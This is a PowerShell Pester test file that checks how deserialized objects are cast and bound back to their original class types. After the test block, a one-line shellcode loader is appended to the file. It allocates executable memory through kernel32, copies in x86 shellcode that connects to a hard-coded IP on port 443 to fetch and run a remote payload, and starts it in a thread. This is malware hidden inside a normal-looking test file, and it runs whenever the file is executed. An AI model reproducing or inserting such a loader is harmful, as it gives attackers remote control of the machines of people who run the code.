

Describe "Tests conversion of deserialized types to original type using object properties." -Tags "CI" {
    BeforeAll {
        
        $type1,$type2,$type3,$type4 = Add-Type -PassThru -TypeDefinition @'
        public class test1
        {
            public string name;
            public int port;
            public string scriptText;
        }

        public class test2
        {
            private string name;
            private int port;
            private string scriptText;

            public string Name
            {
                get { return name; }
                set { name = value; }
            }

            public int Port
            {
                get { return port; }
                set { port = value; }
            }

            public string ScriptText
            {
                get { return scriptText; }
                set { scriptText = value; }
            }
        }

        public class test3
        {
            private string name = "default";
            private int port = 80;
            private string scriptText = "1..6";

            public string Name
            {
                get { return name; }
                set { name = value; }
            }

            public int Port
            {
                get { return port; }
                set { port = value; }
            }

            public string ScriptText
            {
                get { return scriptText; }
            }
        }

        public class test4
        {
            private string name = "default";
            private int port = 80;
            private string scriptText = "1..6";

            public string Name
            {
                get { return name; }
                set { name = value; }
            }

            public int Port
            {
                get { return port; }
                set { port = value; }
            }

            internal void Compute()
            {
                scriptText = scriptText + " Computed";
            }
        }
'@
    }

    Context 'Type conversion and parameter binding of deserialized Type case 1: type definition contains public fields' {
        BeforeAll {
            $t1 = new-object test1 -Property @{name="TestName1";port=80;scriptText="1..5"}
            $s = [System.Management.Automation.PSSerializer]::Serialize($t1)
            $dst1 = [System.Management.Automation.PSSerializer]::Deserialize($s)
        }

        It 'Type casts should succeed.' {
            { $tc1 = [test1]$dst1 }| Should -Not -Throw
        }

        It 'Parameter bindings should succeed.' {

            function test-1
            {
                param(
                    [parameter(position=0, mandatory=1)]
                    [test1] $test
                )

                $test | Format-List | Out-String
            }
            { test-1 $dst1 } | Should -Not -Throw
        }
    }

    Context 'Type conversion and parameter binding of deserialized Type case 2: type definition contains public properties' {
        BeforeAll {
            $t2 = new-object test2 -Property @{Name="TestName2";Port=80;ScriptText="1..5"}
            $s = [System.Management.Automation.PSSerializer]::Serialize($t2)
            $dst2 = [System.Management.Automation.PSSerializer]::Deserialize($s)
        }
        It 'Type casts should succeed.' {
            { $tc2 = [test2]$dst2 } | Should -Not -Throw
        }

        It 'Parameter bindings should succeed.' {
            function test-2
            {
                param(
                    [parameter(position=0, mandatory=1)]
                    [test2] $test
                )

                $test | Format-List | Out-String
            }
            { test-2 $dst2 } | Should -Not -Throw
        }
    }

    Context 'Type conversion and parameter binding of deserialized Type case 1: type definition contains 2 public properties and 1 read only property' {
        BeforeAll {
            $t3 = new-object test3 -Property @{Name="TestName3";Port=80}
            $s = [System.Management.Automation.PSSerializer]::Serialize($t3)
            $dst3 = [System.Management.Automation.PSSerializer]::Deserialize($s)
        }

        It 'Type casts should fail.' {
            { $tc3 = [test3]$dst3 } | Should -Throw -ErrorId 'InvalidCastConstructorException'
        }

        It 'Parameter bindings should fail.' {

            function test-3
            {
                param(
                    [parameter(position=0, mandatory=1)]
                    [test3] $test
                )

                $test | Format-List | Out-String
            }

            { test-3 $dst3 } | Should -Throw -ErrorId 'ParameterArgumentTransformationError,test-3'
        }
    }

    Context 'Type conversion and parameter binding of deserialized Type case 1: type definition contains 2 public properties' {
        BeforeAll {
            $t4 = new-object test4 -Property @{Name="TestName4";Port=80}
            $s = [System.Management.Automation.PSSerializer]::Serialize($t4)
            $dst4 = [System.Management.Automation.PSSerializer]::Deserialize($s)
        }

        It 'Type casts should succeed.' {
            { $tc4 = [test4]$dst4 } | Should -Not -Throw
        }

        It 'Parameter bindings should succeed.' {
            function test-4
            {
                param(
                    [parameter(position=0, mandatory=1)]
                    [test4] $test
                )

                $test | Format-List | Out-String
            }
            { test-4 $dst4 } | Should -Not -Throw
        }
    }

    Context 'Type conversion and parameter binding of deserialized Powershell class with default constructor' {
        BeforeAll {
            class PSClass1 {
                [string] $name = "PSClassName1"
                [int] $port = 80
                [string] $scriptText = "1..6"
            }

            $t5 = [PSClass1]::new()
            $s = [System.Management.Automation.PSSerializer]::Serialize($t5)
            $dst5 = [System.Management.Automation.PSSerializer]::Deserialize($s)
        }

        It 'Type casts should succeed.' {

            { $tc5 = [PSClass1]$dst5 } | Should -Not -Throw
        }

        It 'Parameter bindings should succeed.' {
            function test-PSClass1
            {
                param(
                    [parameter(position=0, mandatory=1)]
                    [PSClass1] $test
                )

                $test | Format-List | Out-String
            }
            { test-PSClass1 $dst5 } | Should -Not -Throw
        }
    }

    Context 'Type conversion and parameter binding of deserialized Powershell class with a defualt constructor and a constructor' {
        BeforeAll {
            class PSClass2 {
                [string] $name = "default"
                [int] $port = 80
                [string] $scriptText = "1..6"
                PSClass2() {}
                PSClass2([string] $name1, [int] $port1, [string] $scriptText1)
                {
                    $this.name = $name1
                    $this.port = $port1
                    $this.scriptText = $scriptText1
                }
            }
            $t6 = [PSClass2]::new("PSClassName2", 80, "1..5")
            $s = [System.Management.Automation.PSSerializer]::Serialize($t6)
            $dst6 = [System.Management.Automation.PSSerializer]::Deserialize($s)
        }

        It 'Type casts should succeed.' {
            { $tc6 = [PSClass2]$dst6 } | Should -Not -Throw
        }

        It 'Parameter bindings should succeed.' {
            function test-PSClass2
            {
                param(
                    [parameter(position=0, mandatory=1)]
                    [PSClass2] $test
                )

                $test | Format-List | Out-String
            }
            { test-PSClass2 $dst6 } | Should -Not -Throw
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xa1,0x8c,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

